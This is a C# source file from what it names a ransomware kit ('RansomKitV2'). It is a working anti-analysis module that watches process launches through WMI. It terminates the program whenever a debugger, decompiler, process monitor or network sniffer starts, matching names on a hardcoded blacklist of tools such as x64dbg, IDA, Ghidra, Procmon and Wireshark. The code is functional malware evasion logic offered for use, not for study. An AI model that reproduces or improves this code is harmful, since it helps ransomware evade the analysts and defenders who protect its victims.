using System;
using System.Management;

namespace RansomKitV2
{
    internal static class ProcessWatcher
    {
        private static ManagementEventWatcher? _watcher;

        // Tools whose launch at runtime means active analysis — abort immediately.
        private static readonly string[] RuntimeBlacklist =
        {
            "dnspy","dnspy-x86","dnspy-x64",
            "ilspy","ilspycmd","dotpeek","reflector",
            "x64dbg","x32dbg","ollydbg","windbg",
            "ida64","ida32","ida","ghidra","radare2","r2",
            "cheatengine","cheatengine-x86_64","cheatengine-i386",
            "processhacker","procmon","procexp","processexplorer","systeminformer",
            "scylla","scylla_x64","lordpe","pe-bear","pebear","cffexplorer",
            "pestudio","die","frida","frida-server",
            "simpleassemblyexplorer","ildasm","monodis",
            "wireshark","fiddler","mitmproxy","httpdebugger",
        };

        public static void Start()
        {
            try
            {
                var query = new WqlEventQuery(
                    "SELECT * FROM Win32_ProcessStartTrace");

                _watcher = new ManagementEventWatcher(query);
                _watcher.EventArrived += OnProcessStart;
                _watcher.Start();
            }
            catch { }
        }

        public static void Stop()
        {
            try { _watcher?.Stop(); } catch { }
            try { _watcher?.Dispose(); } catch { }
            _watcher = null;
        }

        private static void OnProcessStart(object sender, EventArrivedEventArgs e)
        {
            try
            {
                string name = e.NewEvent["ProcessName"]?.ToString() ?? "";
                string bare = name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                    ? name[..^4]
                    : name;

                foreach (var bad in RuntimeBlacklist)
                {
                    if (string.Equals(bare, bad, StringComparison.OrdinalIgnoreCase))
                    {
                        Environment.Exit(0);
                    }
                }
            }
            catch { }
        }
    }
}